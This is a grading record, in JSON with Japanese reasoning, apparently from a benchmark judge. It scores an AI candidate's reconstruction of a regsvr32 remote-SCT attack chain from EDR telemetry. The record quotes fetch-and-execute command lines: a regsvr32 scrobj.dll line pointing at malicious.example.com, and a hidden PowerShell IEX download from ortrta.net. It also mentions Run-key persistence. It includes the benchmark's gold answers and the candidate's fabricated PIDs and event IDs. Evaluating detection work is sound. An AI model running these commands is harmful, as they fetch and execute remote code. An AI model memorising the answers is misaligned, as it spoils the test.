@@ -1,0 +1,386 @@
+{
+  "case_id": "s3_pt_02_regsvr32_remote_sct_stage3",
+  "judge_summary_ja": "候補は EQNEDT32 から regsvr32 の起動（操作=開始）を概ね示したが、PID・経路・コマンドライン・ドメインが大きく乖離し、肝心の前段（svchost/DcomLaunch → EQNEDT32）と後段（regsvr32 による remote SCT 経由の 10.193.66.115:8080 への接続）を再現できていない。さらに regsvr32→PowerShell、PowerShell のネット接続やレジストリ変更といった無関係動作を混入し、具体的な PID/イベントID/パス/ポート/ドメインを多数捏造している。CBC EDR の臨界証拠も満たせていない。",
+  "chains": [
+    {
+      "chain_id": "s3_pt_02_regsvr32_remote_sct",
+      "gold_required_item_scores": [
+        {
+          "item_id": "s3_pt_02_regsvr32_remote_sct:S3-02-S01:subject",
+          "step_id": "S3-02-S01",
+          "kind": "subject",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "svchost.exe / DcomLaunch (PID 648) に関する記述が候補に存在しない。"
+        },
+        {
+          "item_id": "s3_pt_02_regsvr32_remote_sct:S3-02-S01:operation",
+          "step_id": "S3-02-S01",
+          "kind": "operation",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "S3-02-S01 の操作「started」を示す対応する主語・客体の記載がない。"
+        },
+        {
+          "item_id": "s3_pt_02_regsvr32_remote_sct:S3-02-S01:object",
+          "step_id": "S3-02-S01",
+          "kind": "object",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "対象オブジェクト EQNEDT32.EXE (PID 6032) が svchost から起動された事実が再現されていない。"
+        },
+        {
+          "item_id": "s3_pt_02_regsvr32_remote_sct:S3-02-S01:critical_evidence",
+          "step_id": "S3-02-S01",
+          "kind": "critical_evidence",
+          "matched_candidate_excerpt": null,
+          "score": "0",
+          "reason_ja": "該当ステップを裏付ける CBC EDR テレメトリの提示がない（sysmon のみ）。"
+        },
+        {
+          "item_id": "s3_pt_02_regsvr32_remote_sct:S3-02-S02:subject",
+          "step_id": "S3-02-S02",
+          "kind": "subject",
+          "matched_candidate_excerpt": "EQNEDT32.EXE（pid 3456 と主張）",
+          "score": "0",
+          "reason_ja": "主語の PID と配置が不一致（6032 が正、候補は 3456 かつパスも異なる）。"
+        },
+        {
+          "item_id": "s3_pt_02_regsvr32_remote_sct:S3-02-S02:operation",
+          "step_id": "S3-02-S02",
+          "kind": "operation",
+          "matched_candidate_excerpt": "operation: \"process_start\"",
+          "score": "1",
+          "reason_ja": "操作「process_start」は実質的に「started」と一致。"
+        },
+        {
+          "item_id": "s3_pt_02_regsvr32_remote_sct:S3-02-S02:object",
+          "step_id": "S3-02-S02",
+          "kind": "object",
+          "matched_candidate_excerpt": "object.name: \"regsvr32.exe\"（child_pid 4567 と主張）",
+          "score": "0",
+          "reason_ja": "対象の PID が不一致（6124 が正、候補は 4567）。"
+        },
+        {
+          "item_id": "s3_pt_02_regsvr32_remote_sct:S3-02-S02:critical_evidence",
+          "step_id": "S3-02-S02",
+          "kind": "critical_evidence",
+          "matched_candidate_excerpt": "evidence.source_stream: \"sysmon\"",
+          "score": "0",
+          "reason_ja": "臨界証拠要件は CBC EDR の標準テレメトリ。sysmon のみで未充足。"
+        },
+        {
+          "item_id": "s3_pt_02_regsvr32_remote_sct:S3-02-S03:subject",
+          "step_id": "S3-02-S03",
+          "kind": "subject",
+          "matched_candidate_excerpt": "subject_process.name: \"powershell.exe\"",
+          "score": "0",
+          "reason_ja": "主語プロセスが不一致（正は regsvr32.exe (PID 6124)、候補は powershell.exe）。"
+        },
+        {
+          "item_id": "s3_pt_02_regsvr32_remote_sct:S3-02-S03:operation",
+          "step_id": "S3-02-S03",
+          "kind": "operation",
+          "matched_candidate_excerpt": "operation: \"network_connection\"",
+          "score": "0",
+          "reason_ja": "操作が不一致。正は「remote SCT コマンドによる接続作成」、候補は一般的なネット接続。"
+        },
+        {
+          "item_id": "s3_pt_02_regsvr32_remote_sct:S3-02-S03:object",
+          "step_id": "S3-02-S03",
+          "kind": "object",
+          "matched_candidate_excerpt": "object.value: \"ortrta.net\"（remote_port 80 と主張）",
+          "score": "0",
+          "reason_ja": "対象が不一致（正は ortrta.net / 10.193.66.115:8080、候補はポート80）。"
+        },
+        {
+          "item_id": "s3_pt_02_regsvr32_remote_sct:S3-02-S03:critical_evidence",
+          "step_id": "S3-02-S03",
+          "kind": "critical_evidence",
+          "matched_candidate_excerpt": "evidence.source_stream: \"cbc-edr\"（powershell.exe の接続で主張）",
+          "score": "0",
+          "reason_ja": "CBC EDR は提示されたが、該当ステップ（regsvr32 の接続）を裏付けるものではない。"
+        }
+      ],
+      "candidate_action_claim_scores": [
+        {
+          "candidate_claim_id": "C1",
+          "candidate_step_id": "S1",
+          "claim_excerpt": "EQNEDT32.EXE が regsvr32.exe を起動（command_line: \"regsvr32.exe /s /n /u /i:http://malicious.example.com/payload.sct scrobj.dll\"）",
+          "normalized_action_claim_ja": "EQNEDT32.EXE が regsvr32.exe を開始した。",
+          "slot_scores": [
+            {
+              "slot_id": "C1-subject",
+              "kind": "subject",
+              "candidate_slot_excerpt": "subject_process: EQNEDT32.EXE (pid 3456, path C:\\Program Files\\Microsoft Office\\root\\Office16\\EQNEDT32.EXE)",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "hallucinated_value",
+              "reason_ja": "主語は EQNEDT32 だが PID/パスが捏造・不一致（6032 かつ Common Files 配下が正）。"
+            },
+            {
+              "slot_id": "C1-operation",
+              "kind": "operation",
+              "candidate_slot_excerpt": "operation: process_start",
+              "matched_gold_item_id": "s3_pt_02_regsvr32_remote_sct:S3-02-S02:operation",
+              "is_true_positive": "1",
+              "false_positive_type": "none",
+              "reason_ja": "process_start は「started」と実質同義であり、S3-02-S02 の操作を満たす。"
+            },
+            {
+              "slot_id": "C1-object",
+              "kind": "object",
+              "candidate_slot_excerpt": "object.name: regsvr32.exe（child_pid 4567）",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "hallucinated_value",
+              "reason_ja": "対象 PID が不一致（正は 6124）。"
+            },
+            {
+              "slot_id": "C1-command_line",
+              "kind": "command_line",
+              "candidate_slot_excerpt": "regsvr32.exe /s /n /u /i:http://malicious.example.com/payload.sct scrobj.dll",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "hallucinated_value",
+              "reason_ja": "コマンドラインのドメイン・URL が不一致（正は http://ortrta.net:8080/...）。"
+            },
+            {
+              "slot_id": "C1-critical_evidence",
+              "kind": "critical_evidence",
+              "candidate_slot_excerpt": "evidence.source_stream: sysmon（event_record_id 123456, 123457）",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "unsupported_evidence",
+              "reason_ja": "臨界証拠要件（CBC EDR テレメトリ）を満たしていない。"
+            }
+          ]
+        },
+        {
+          "candidate_claim_id": "C2",
+          "candidate_step_id": "S2",
+          "claim_excerpt": "regsvr32.exe が powershell.exe を起動（powershell.exe -nop -w hidden -c IEX ...）",
+          "normalized_action_claim_ja": "regsvr32.exe が PowerShell を開始した。",
+          "slot_scores": [
+            {
+              "slot_id": "C2-subject",
+              "kind": "subject",
+              "candidate_slot_excerpt": "subject_process: regsvr32.exe (pid 4567)",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "hallucinated_value",
+              "reason_ja": "regsvr32 の PID が不一致（正は 6124）。"
+            },
+            {
+              "slot_id": "C2-operation",
+              "kind": "operation",
+              "candidate_slot_excerpt": "operation: process_start",
+              "matched_gold_item_id": "s3_pt_02_regsvr32_remote_sct:S3-02-S02:operation",
+              "is_true_positive": "0",
+              "false_positive_type": "duplicate_claim",
+              "reason_ja": "同一「started」項目は C1 で既に充足。重複は加点不可。"
+            },
+            {
+              "slot_id": "C2-object",
+              "kind": "object",
+              "candidate_slot_excerpt": "object.name: powershell.exe",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "本件ゴールドには PowerShell 起動は含まれない。"
+            },
+            {
+              "slot_id": "C2-command_line",
+              "kind": "command_line",
+              "candidate_slot_excerpt": "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://ortrta.net/payload.ps1')",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "ゴールドの必須項目ではなく、行動連鎖にも含まれない。"
+            },
+            {
+              "slot_id": "C2-critical_evidence",
+              "kind": "critical_evidence",
+              "candidate_slot_excerpt": "evidence.source_stream: sysmon（event_record_id 123458, 123459）",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "unsupported_evidence",
+              "reason_ja": "CBC EDR の臨界証拠ではない。"
+            }
+          ]
+        },
+        {
+          "candidate_claim_id": "C3",
+          "candidate_step_id": "S3",
+          "claim_excerpt": "powershell.exe が ortrta.net (10.193.66.115:80) にネットワーク接続",
+          "normalized_action_claim_ja": "PowerShell が ortrta.net:80 に接続を作成した。",
+          "slot_scores": [
+            {
+              "slot_id": "C3-subject",
+              "kind": "subject",
+              "candidate_slot_excerpt": "subject_process: powershell.exe (pid 5678)",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "主語が不一致（正は regsvr32.exe）。"
+            },
+            {
+              "slot_id": "C3-operation",
+              "kind": "operation",
+              "candidate_slot_excerpt": "operation: network_connection",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "unsupported_inference",
+              "reason_ja": "正は「remote SCT コマンドによる接続作成」であり、より具体的。"
+            },
+            {
+              "slot_id": "C3-object",
+              "kind": "object",
+              "candidate_slot_excerpt": "netconn_domain: ortrta.net, remote_ip: 10.193.66.115, remote_port: 80",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "hallucinated_value",
+              "reason_ja": "ポートが不一致（正は 8080）。"
+            },
+            {
+              "slot_id": "C3-critical_evidence",
+              "kind": "critical_evidence",
+              "candidate_slot_excerpt": "evidence.source_stream: cbc-edr（event_record_id 123460, 123461）",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "unsupported_evidence",
+              "reason_ja": "CBC EDR ではあるが、対象ステップ（regsvr32 の接続）を裏付けていない。"
+            }
+          ]
+        },
+        {
+          "candidate_claim_id": "C4",
+          "candidate_step_id": "S4",
+          "claim_excerpt": "powershell.exe がレジストリ HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run を変更",
+          "normalized_action_claim_ja": "PowerShell が Run キーを変更した。",
+          "slot_scores": [
+            {
+              "slot_id": "C4-subject",
+              "kind": "subject",
+              "candidate_slot_excerpt": "subject_process: powershell.exe (pid 5678)",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "この動作はゴールドの行動連鎖に含まれない。"
+            },
+            {
+              "slot_id": "C4-operation",
+              "kind": "operation",
+              "candidate_slot_excerpt": "operation: registry_modification",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "ゴールドにレジストリ変更は存在しない。"
+            },
+            {
+              "slot_id": "C4-object",
+              "kind": "object",
+              "candidate_slot_excerpt": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "nearby_unrelated",
+              "reason_ja": "ゴールドに該当オブジェクトはない。"
+            },
+            {
+              "slot_id": "C4-critical_evidence",
+              "kind": "critical_evidence",
+              "candidate_slot_excerpt": "evidence.source_stream: sysmon（event_record_id 123462）",
+              "matched_gold_item_id": null,
+              "is_true_positive": "0",
+              "false_positive_type": "unsupported_evidence",
+              "reason_ja": "臨界証拠の要件（CBC EDR）を満たさない。"
+            }
+          ]
+        }
+      ],
+      "order_pairs": [
+        {
+          "before_step_id": "S3-02-S01",
+          "after_step_id": "S3-02-S02",
+          "score": "0",
+          "reason_ja": "S3-02-S01 が復元されていないため順序を評価できない。"
+        },
+        {
+          "before_step_id": "S3-02-S02",
+          "after_step_id": "S3-02-S03",
+          "score": "0",
+          "reason_ja": "S3-02-S03 が復元されていないため順序を評価できない。"
+        }
+      ]
+    }
+  ],
+  "error_flags": {
+    "target_missing": [
+      "s3_pt_02_regsvr32_remote_sct:S3-02-S01:subject",
+      "s3_pt_02_regsvr32_remote_sct:S3-02-S01:operation",
+      "s3_pt_02_regsvr32_remote_sct:S3-02-S01:object",
+      "s3_pt_02_regsvr32_remote_sct:S3-02-S01:critical_evidence",
+      "s3_pt_02_regsvr32_remote_sct:S3-02-S02:subject",
+      "s3_pt_02_regsvr32_remote_sct:S3-02-S02:object",
+      "s3_pt_02_regsvr32_remote_sct:S3-02-S02:critical_evidence",
+      "s3_pt_02_regsvr32_remote_sct:S3-02-S03:subject",
+      "s3_pt_02_regsvr32_remote_sct:S3-02-S03:operation",
+      "s3_pt_02_regsvr32_remote_sct:S3-02-S03:object",
+      "s3_pt_02_regsvr32_remote_sct:S3-02-S03:critical_evidence"
+    ],
+    "chain_mixing": true,
+    "hallucinated_claims": [
+      "捏造PID: EQNEDT32.EXE pid=3456（正は6032）",
+      "捏造PID: regsvr32.exe child_pid=4567（正は6124）",
+      "捏造PID: powershell.exe pid=5678（ゴールドに該当なし）",
+      "捏造event_record_id: 123456, 123457, 123458, 123459, 123460, 123461, 123462",
+      "捏造/不一致パス: C:\\Program Files\\Microsoft Office\\root\\Office16\\EQNEDT32.EXE（正は C:\\Program Files\\Common Files\\Microsoft Shared\\Equation\\EQNEDT32.EXE）",
+      "不一致ドメイン: malicious.example.com（正は ortrta.net）",
+      "不一致ポート: 80（正は 8080）",
+      "不一致コマンドライン: regsvr32 の /i:http://malicious.example.com/payload.sct（正は http://ortrta.net:8080/...sct）"
+    ],
+    "unsupported_evidence": [
+      "sysmon を臨界証拠として使用（S1, S2, S4）",
+      "cbc-edr の event_record_id 123460/123461 を PowerShell の接続に適用（ゴールドの regsvr32 接続には非対応）"
+    ],
+    "contradicted_evidence": [],
+    "nearby_action_false_positives": [
+      "regsvr32.exe が PowerShell を起動",
+      "PowerShell が ortrta.net (10.193.66.115:80) に接続",
+      "PowerShell がレジストリ HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run を変更"
+    ],
+    "weak_grounding": true,
+    "false_positive_claims": [
+      "EQNEDT32.EXE の PID/パスを誤って主張",
+      "regsvr32.exe の PID を誤って主張",
+      "regsvr32.exe のコマンドラインに malicious.example.com を主張",
+      "PowerShell によるネット接続・レジストリ変更を本連鎖に混入"
+    ],
+    "notes_ja": [
+      "操作『started』のみが一部一致したが、主語・客体・証拠の大半が不一致。"
+    ]
+  },
+  "candidate_action_claim_count": 4,
+  "candidate_action_claim_slot_count": 18,
+  "candidate_action_claim_true_positive_slot_count": 1,
+  "hallucinated_claim_count": 8,
+  "unsupported_evidence_count": 2,
+  "contradicted_evidence_count": 0,
+  "nearby_action_fp_count": 3,
+  "main_missing_items": [
+    "s3_pt_02_regsvr32_remote_sct:S3-02-S01:subject",
+    "s3_pt_02_regsvr32_remote_sct:S3-02-S01:operation",
+    "s3_pt_02_regsvr32_remote_sct:S3-02-S01:object",
+    "s3_pt_02_regsvr32_remote_sct:S3-02-S02:subject",
+    "s3_pt_02_regsvr32_remote_sct:S3-02-S02:object",
+    "s3_pt_02_regsvr32_remote_sct:S3-02-S03:subject",
+    "s3_pt_02_regsvr32_remote_sct:S3-02-S03:operation",
+    "s3_pt_02_regsvr32_remote_sct:S3-02-S03:object"
+  ],
+  "main_false_positive_claims": [
+    "EQNEDT32.EXE が regsvr32.exe を malicious.example.com の SCT で起動",
+    "regsvr32.exe が PowerShell を起動",
+    "PowerShell が ortrta.net:80 に接続",
+    "PowerShell が HKCU\\...\\Run を変更"
+  ]
+}
